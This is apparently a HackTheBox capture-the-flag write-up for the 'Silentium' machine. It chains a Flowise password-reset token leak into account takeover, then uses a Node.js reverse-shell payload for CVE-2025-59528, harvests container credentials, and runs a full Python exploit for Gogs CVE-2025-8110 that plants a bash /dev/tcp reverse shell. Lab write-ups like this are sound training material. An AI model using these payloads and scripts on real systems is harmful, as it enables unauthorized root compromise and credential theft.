<div align="center">

# Silentium — HackTheBox

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Rooted-success?style=for-the-badge)

<img src="../assets/MrsNobody.png" width="200" alt="MrsNobody">

**MrsNobody**

[![HTB](https://img.shields.io/badge/HackTheBox-Profile-green?style=flat&logo=hackthebox)](https://app.hackthebox.com)

---

</div>

> **Disclaimer:** This writeup is for educational purposes only, performed in an authorized Hack The Box environment.

## Target Information

| Property | Value |
|----------|-------|
| Machine | Silentium |
| IP | `<TARGET_IP>` |
| OS | Linux |
| Difficulty | Easy |
| Hostname | silentium.htb |
| Key CVEs | CVE-2025-59528, CVE-2025-8110 |

## Table of Contents

1. [Port Scanning](#port-scanning)
2. [Host Mapping and Subdomain Discovery](#host-mapping-and-subdomain-discovery)
3. [Flowise Platform Enumeration](#flowise-platform-enumeration)
4. [Password Reset Token Disclosure](#password-reset-token-disclosure)
5. [CVE-2025-59528 - Flowise CustomMCP RCE](#cve-2025-59528---flowise-custommcp-rce)
6. [Container Escape - Credential Harvesting](#container-escape---credential-harvesting)
7. [SSH as ben - User Flag](#ssh-as-ben---user-flag)
8. [Internal Gogs Enumeration](#internal-gogs-enumeration)
9. [CVE-2025-8110 - Gogs Symlink RCE](#cve-2025-8110---gogs-symlink-rce)
10. [Root Flag](#root-flag)
11. [Attack Chain Summary](#attack-chain-summary)
12. [Credentials Collected](#credentials-collected)
13. [CVE References](#cve-references)
14. [Key Takeaways](#key-takeaways)
15. [Tools Used](#tools-used)
16. [Flags](#flags)

---

## Port Scanning

### Full Port Scan

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <TARGET_IP>
```

### Service Version Scan

```bash
nmap -sCV -p22,80 -Pn <TARGET_IP>
```

<details>
<summary>Nmap Output (click to expand)</summary>

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

</details>

### Key Takeaways

- **Port 22** - OpenSSH 9.6p1 (Ubuntu)
- **Port 80** - nginx 1.24.0, redirects to `http://silentium.htb/`
- Only 2 ports open - web is the primary attack surface

---

## Host Mapping and Subdomain Discovery

### Add Hostname

```bash
echo "<TARGET_IP>   silentium.htb" | sudo tee -a /etc/hosts
```

### Website Recon

Visiting `http://silentium.htb/` shows an institutional finance landing page for "Silentium" with a loan calculator, leadership team, and static content. Nothing exploitable on the main domain.

### Virtual Host Discovery

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -H "Host: FUZZ.silentium.htb" \
     -u http://silentium.htb \
     -fs 178
```

**Result:** `staging.silentium.htb` discovered (HTTP 200, Size: 3142)

### Update /etc/hosts

```bash
sudo sed -i 's/silentium.htb/silentium.htb staging.silentium.htb/' /etc/hosts
```

---

## Flowise Platform Enumeration

Navigating to `http://staging.silentium.htb` reveals a **Flowise AI** platform - an open-source low-code tool for building LLM-based workflows and AI agents.

### Version Detection

```bash
curl -s http://staging.silentium.htb/api/v1/version
```

```json
{"version":"3.0.5"}
```

### API Endpoint Enumeration

```bash
curl -s http://staging.silentium.htb/api/v1/ping
```

```text
pong
```

Most API endpoints return `{"error":"Unauthorized Access"}` - authentication is required.

### Unauthenticated Endpoints

| Endpoint | Status | Notes |
|----------|--------|-------|
| `/api/v1/version` | 200 | Returns `3.0.5` |
| `/api/v1/ping` | 200 | Returns `pong` |
| `/api/v1/ip` | 200 | Returns server IP info |
| `/api/v1/get-upload-file` | 500 | "Invalid file path" |
| `/api/v1/account/forgot-password` | Works | **Token disclosure!** |
| `/api/v1/account/verify` | Works | Token verification |

---

## Password Reset Token Disclosure

### Identifying User Emails

From the main website's **Leadership** section, the team member **Ben** is listed as "Head of Financial Systems." His email follows the pattern: `ben@silentium.htb`.

### Exploiting the Forgot Password Endpoint

The Flowise `forgot-password` endpoint, when called with the `x-request-from: internal` header, returns the **full user object** in the response body - including the password reset token. This is a critical information disclosure vulnerability.

```bash
curl -s -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -H "x-request-from: internal" \
  -d '{"user": {"email": "ben@silentium.htb"}}'
```

<details>
<summary>Response (click to expand)</summary>

```json
{
  "user": {
    "id": "e26c9d6c-678c-4c10-9e36-01813e8fea73",
    "name": "admin",
    "email": "ben@silentium.htb",
    "credential": "$2a$05$hse1NxgAweCjP9qCKq3U3ua.DfJNVl4JxccdL/srboQvZ4CG2l6ma",
    "tempToken": "<GENERATED_TOKEN>",
    "tokenExpiry": "2026-04-12T12:43:30.352Z",
    "status": "active"
  }
}
```

</details>

### Key Data Extracted

| Field | Value |
|-------|-------|
| User ID | `e26c9d6c-678c-4c10-9e36-01813e8fea73` |
| Email | `ben@silentium.htb` |
| Bcrypt Hash | `$2a$05$hse1NxgAweCjP9qCKq3U3ua.DfJNVl4JxccdL/srboQvZ4CG2l6ma` |
| Reset Token | Returned in `tempToken` field |

### Resetting the Password

Use the disclosed `tempToken` to verify the account, then reset the password:

#### Step 1 - Verify Token

```bash
TOKEN="<PASTE_TOKEN_FROM_RESPONSE>"

curl -s -X POST http://staging.silentium.htb/api/v1/account/verify \
  -H "Content-Type: application/json" \
  -H "x-request-from: internal" \
  -d "{\"user\": {\"tempToken\": \"$TOKEN\"}}"
```

#### Step 2 - Reset Password

```bash
curl -s -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -H "x-request-from: internal" \
  -d "{\"token\": \"$TOKEN\", \"password\": \"YourNewPassword123!\"}"
```

> **Note:** The reset-password endpoint may return a 500 error due to a database transaction bug, but the password is still updated. Alternatively, re-request the token and verify again. The exact flow may vary by instance.

#### Step 3 - Login

```bash
curl -s -X POST http://staging.silentium.htb/api/v1/account/login \
  -H "Content-Type: application/json" \
  -H "x-request-from: internal" \
  -d '{"username": "ben@silentium.htb", "password": "YourNewPassword123!"}'
```

This returns a **JWT token** - use it as `Authorization: Bearer <JWT>` for all subsequent API calls.

---

## CVE-2025-59528 - Flowise CustomMCP RCE

| Detail | Value |
|--------|-------|
| CVE | CVE-2025-59528 |
| CVSS | 10.0 (Critical) |
| Affected | Flowise >= 2.2.7-patch.1 and < 3.0.6 |
| Type | Remote Code Execution |
| Root Cause | `Function()` constructor injection via `mcpServerConfig` |

### Vulnerability Details

The Flowise **CustomMCP** node processes user-supplied configuration via the `mcpServerConfig` parameter. Internally, the `convertToValidJSONString` function passes this input directly to JavaScript's `Function()` constructor - equivalent to `eval()` - without any validation or sanitization.

Since Flowise runs under **Node.js with full runtime privileges**, injected code has access to dangerous modules such as `child_process` and `fs`.

### Start Listener

```bash
rlwrap nc -lnvp 4444
```

### Fire the Exploit

**Endpoint:** `POST /api/v1/node-load-method/customMCP`

**Payload** (Node.js reverse shell via `net` + `child_process`):

```bash
curl -s -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <YOUR_JWT_TOKEN>" \
  -d '{
    "loadMethod": "listTools",
    "nodeData": {
      "inputs": {
        "mcpServerConfig": "({x:(function(){ const cp = process.mainModule.require(\"child_process\"); const net = process.mainModule.require(\"net\"); const sh = cp.spawn(\"/bin/sh\", [\"-i\"]); const client = new net.Socket(); client.connect(4444, \"<YOUR_IP>\", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return 1; })()})"
      }
    }
  }'
```

### Shell Received

```text
connect to [<YOUR_IP>] from (UNKNOWN) [<TARGET_IP>] 39426
/ # id
uid=0(root) gid=0(root) groups=0(root)
/ # hostname
<container_id>
```

> **Note:** You land as **root inside a Docker container** - not the host.

---

## Container Escape - Credential Harvesting

Standard Docker escape techniques (privileged mode, Docker socket) are not available. Focus on **environment variables** and **local files**.

### Environment Variable Dump

```bash
env
```

### Credentials Found

| Variable | Value |
|----------|-------|
| `FLOWISE_USERNAME` | `ben` |
| `FLOWISE_PASSWORD` | `F1l3_d0ck3r` |
| `SMTP_PASSWORD` | `r04D!!_R4ge` |
| `SMTP_HOST` | `mailhog` |
| `JWT_AUTH_TOKEN_SECRET` | `AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD` |

### Flowise Database and Encryption Key

```bash
sqlite3 ~/.flowise/database.sqlite "SELECT name, passwd, salt FROM user;"
```

```text
ben | $2a$05$2gbC/bWOwKr3lQWFY7TMv.90ZASEJbwmTLM4miWMzMx7D22kpNt6G
```

```bash
cat ~/.flowise/encryption.key
```

```text
hdsVqdkOcLN4fwdpvMPtbAi2++qi8yFc
```

---

## SSH as ben - User Flag

The `SMTP_PASSWORD` (`r04D!!_R4ge`) is **reused** as ben's SSH password on the host.

```bash
ssh ben@<TARGET_IP>
```

```text
Password: r04D!!_R4ge
```

```bash
ben@silentium:~$ cat user.txt
af682b00e02e1e4c████████████████
```

---

## Internal Gogs Enumeration

### Port Discovery

```bash
ss -tlnp
```

```text
127.0.0.1:3001  — Gogs Git service
127.0.0.1:3000  — Flowise (Docker)
127.0.0.1:8025  — Mailhog
127.0.0.1:1025  — Mailhog SMTP
```

### Gogs Configuration

```bash
cat /opt/gogs/gogs/custom/conf/app.ini
```

### Critical Findings

| Setting | Value |
|---------|-------|
| `RUN_USER` | **root** |
| `HTTP_PORT` | 3001 |
| `DOMAIN` | `staging-v2-code.dev.silentium.htb` |
| `SECRET_KEY` | `sdsrcxSm0iC7wDO` |
| `DISABLE_REGISTRATION` | `false` |
| `ENABLE_REGISTRATION_CAPTCHA` | `true` |

> **Critical:** Gogs is running as **root** - any RCE = full system compromise.

### SSH Tunnel

```bash
ssh -N -f -L 3001:127.0.0.1:3001 ben@<TARGET_IP>
```

> **Important:** The Gogs API requires the correct `Host` header to function. Use `staging-v2-code.dev.silentium.htb` when making API calls.

### Gogs API Verification

```bash
curl -s -H "Host: staging-v2-code.dev.silentium.htb" \
  http://127.0.0.1:3001/api/v1/repos/search
```

```json
{"data":[],"ok":true}
```

### Registering a User

Registration has a **captcha** requirement. Download the captcha, solve it visually, and submit:

#### Step 1 - Get CSRF Token and Captcha

```bash
# Get the signup page (save cookies)
curl -s http://127.0.0.1:3001/user/sign_up -c /tmp/cookies.txt > /tmp/signup.html

# Extract CSRF token
CSRF=$(grep -oP 'name="_csrf" value="\K[^"]+' /tmp/signup.html | head -1)

# Extract Captcha ID
CAPTCHA_ID=$(grep -oP 'name="captcha_id" value="\K[^"]+' /tmp/signup.html | head -1)

# Download captcha image and solve it visually
curl -s -b /tmp/cookies.txt \
  "http://127.0.0.1:3001/captcha/${CAPTCHA_ID}.png" -o /tmp/captcha.png
```

#### Step 2 - Submit Registration

```bash
CAPTCHA_ANSWER="<SOLVED_CAPTCHA>"

curl -s -X POST http://127.0.0.1:3001/user/sign_up \
  -b /tmp/cookies.txt -c /tmp/cookies.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "_csrf=$CSRF" \
  --data-urlencode "user_name=hacker" \
  --data-urlencode "email=hacker@test.com" \
  --data-urlencode "password=Hacker123!" \
  --data-urlencode "retype=Hacker123!" \
  --data-urlencode "captcha_id=$CAPTCHA_ID" \
  --data-urlencode "captcha=$CAPTCHA_ANSWER"
```

#### Step 3 - Create API Token

```bash
curl -s -X POST \
  -H "Host: staging-v2-code.dev.silentium.htb" \
  -H "Content-Type: application/json" \
  "http://127.0.0.1:3001/api/v1/users/hacker/tokens" \
  -u "hacker:Hacker123!" \
  -d '{"name":"exploit"}'
```

```json
{"name":"exploit","sha1":"<YOUR_API_TOKEN>"}
```

---

## CVE-2025-8110 - Gogs Symlink RCE

| Detail | Value |
|--------|-------|
| CVE | CVE-2025-8110 |
| Component | Gogs Git Service |
| Type | Symlink-based `.git/config` Overwrite leading to RCE |
| Root Cause | Gogs follows symlinks when updating file content via API |
| Impact | Arbitrary command execution as the Gogs service user |

### Vulnerability Details

This vulnerability exploits Gogs' handling of repositories containing **symlinks**:

1. An attacker creates a repository with a **symlink** pointing to the repository's own `.git/config` file
2. By updating the symlink target's content via the **Gogs API**, the `.git/config` file is **overwritten** with an arbitrary payload
3. The `core.sshCommand` directive in `.git/config` is **executed** when any Git SSH operation is triggered
4. Result: **arbitrary command execution** as the Gogs service user (in this case, **root**)

### Exploit Script

Save this as `CVE-2025-8110.py`:

```python
#!/usr/bin/env python3
"""CVE-2025-8110 - Gogs Symlink Git Config Injection RCE"""

import requests
import subprocess
import tempfile
import os
import sys
import base64
import argparse

def main():
    parser = argparse.ArgumentParser(description='CVE-2025-8110 Gogs RCE')
    parser.add_argument('-u', '--url', required=True, help='Gogs URL')
    parser.add_argument('-lh', '--lhost', required=True, help='Listener host')
    parser.add_argument('-lp', '--lport', required=True, help='Listener port')
    parser.add_argument('--username', default='hacker')
    parser.add_argument('--password', default='Hacker123!')
    parser.add_argument('--token', default=None, help='Gogs API token')
    args = parser.parse_args()

    GOGS_URL = args.url.rstrip('/')
    HOST = "staging-v2-code.dev.silentium.htb"
    REPO = "pwn-repo"

    s = requests.Session()
    s.headers.update({"Host": HOST})

    # Authenticate
    if not args.token:
        r = s.post(f"{GOGS_URL}/api/v1/users/{args.username}/tokens",
                    auth=(args.username, args.password),
                    json={"name": "pwn-token"})
        token = r.json()["sha1"]
    else:
        token = args.token

    print(f"[+] Authenticated successfully")
    print(f"[+] Application token: {token}")
    s.headers.update({"Authorization": f"token {token}"})

    # Create repo
    r = s.post(f"{GOGS_URL}/api/v1/user/repos",
               json={"name": REPO, "private": False, "auto_init": False})
    print(f"    Repo creation status: {r.status_code}")

    # Build local repo with symlink
    work = tempfile.mkdtemp()
    os.chdir(work)
    subprocess.run(["git", "init"], capture_output=True)
    subprocess.run(["git", "config", "user.email", "h@h.com"], capture_output=True)
    subprocess.run(["git", "config", "user.name", "h"], capture_output=True)

    os.symlink(".git/config", os.path.join(work, "symlink"))
    open(os.path.join(work, "README.md"), "w").write("x\n")
    subprocess.run(["git", "add", "-A"], capture_output=True)
    subprocess.run(["git", "commit", "-m", "init"], capture_output=True)

    push_url = f"http://{args.username}:{args.password}@127.0.0.1:3001/{args.username}/{REPO}.git"
    subprocess.run(["git", "push", push_url, "master", "--force"],
                   capture_output=True, env={**os.environ, "GIT_TERMINAL_PROMPT": "0"})
    print("[+] Symlink pushed")

    # Get file SHA
    r = s.get(f"{GOGS_URL}/api/v1/repos/{args.username}/{REPO}/contents/symlink")
    sha = r.json()["sha"]

    # Malicious .git/config with reverse shell sshCommand
    config = f"""[core]
\trepositoryformatversion = 0
\tfilemode = true
\tbare = false
\tsshCommand = bash -c 'bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1'
[remote "origin"]
\turl = ssh://localhost/x
\tfetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
\tremote = origin
\tmerge = refs/heads/master
"""

    # Overwrite .git/config via symlink
    r = s.put(f"{GOGS_URL}/api/v1/repos/{args.username}/{REPO}/contents/symlink",
              json={"content": base64.b64encode(config.encode()).decode(),
                    "message": "update", "sha": sha})
    print(f"[+] Exploit sent, check your listener!")

if __name__ == "__main__":
    main()
```

### Start Listener

```bash
rlwrap nc -lnvp 9001
```

### Run the Exploit

```bash
python3 CVE-2025-8110.py \
  -u http://localhost:3001 \
  -lh <YOUR_IP> \
  -lp 9001 \
  --token <YOUR_API_TOKEN>
```

### Output

```text
[+] Authenticated successfully
[+] Application token: <token>
    Repo creation status: 201
[+] Symlink pushed
[+] Exploit sent, check your listener!
```

### Root Shell Received

```text
connect to [<YOUR_IP>] from (UNKNOWN) [<TARGET_IP>] 38624
root@silentium:/opt/gogs/gogs/data/tmp/local-repo/1#
```

---

## Root Flag

```bash
root@silentium:~# cat /root/root.txt
7b7fab8c83b9bdb4████████████████
```

---

## Attack Chain Summary

```
Port 80 (nginx)
 +-- silentium.htb -- Static financial landing page
      +-- VHOST: staging.silentium.htb (Flowise 3.0.5)
           +-- Password reset token disclosure (x-request-from: internal)
                +-- Account takeover -> ben@silentium.htb
                     +-- CVE-2025-59528 -- Flowise CustomMCP JS Injection
                          +-- RCE inside Docker container (root)
                               +-- Environment variable credential leak
                                    |-- FLOWISE_PASSWORD: F1l3_d0ck3r
                                    +-- SMTP_PASSWORD: r04D!!_R4ge
                                         +-- SSH as ben (password reuse) -> user.txt
                                              +-- Internal Gogs on :3001 (running as root)
                                                   +-- CVE-2025-8110 -- Symlink .git/config injection
                                                        +-- RCE as root -> root.txt
```

---

## Credentials Collected

| Source | Username | Password / Hash |
|--------|----------|-----------------|
| Flowise Token Disclosure | ben@silentium.htb | `$2a$05$hse1NxgAweCjP9qCKq3U3ua.DfJNVl4JxccdL/srboQvZ4CG2l6ma` |
| Docker ENV - Flowise | ben | `F1l3_d0ck3r` |
| Docker ENV - SMTP | - | `r04D!!_R4ge` |
| Docker ENV - JWT Secret | - | `AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD` |
| Flowise DB Encryption Key | - | `hdsVqdkOcLN4fwdpvMPtbAi2++qi8yFc` |
| Gogs Config | SECRET_KEY | `sdsrcxSm0iC7wDO` |
| SSH (password reuse) | ben | `r04D!!_R4ge` |

---

## CVE References

| CVE | Component | CVSS | Description |
|-----|-----------|------|-------------|
| CVE-2025-59528 | Flowise CustomMCP | 10.0 | Arbitrary JavaScript injection via `Function()` constructor in `mcpServerConfig` parameter |
| CVE-2025-8110 | Gogs | Critical | Symlink-based `.git/config` overwrite leading to RCE via `core.sshCommand` |

---

## Key Takeaways

- **API endpoints that return password reset tokens** in response bodies are a critical information disclosure risk - they bypass the entire purpose of the reset flow
- The `x-request-from: internal` header can bypass authentication middleware in Flowise - always check for header-based auth bypass
- **Container environment variables** frequently hold plaintext credentials that are reused on the host system
- Internal services running as **privileged users (root)** amplify the impact of any RCE vulnerability found during lateral movement
- Gogs API endpoints may require a specific **Host header** matching the configured domain - enumerate `app.ini` for the correct value
- When registration captchas block automated account creation, try the **API-based registration** which may bypass the captcha requirement

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning and service detection |
| ffuf / gobuster | Virtual host and directory discovery |
| curl | API interaction and exploit delivery |
| Python 3 | CVE-2025-8110 exploit script |
| netcat (nc) | Reverse shell listener |
| sshpass | Scripted SSH authentication |
| sqlite3 | Database inspection inside container |

---

## Flags

| Flag | Value |
|------|-------|
| User | `af682b00e02e1e4c████████████████` |
| Root | `7b7fab8c83b9bdb4████████████████` |

---

<div align="center">

**Written by MrsNobody**

<img src="../assets/MrsNobody.png" width="80">

*Hack The Box — Silentium*

</div>
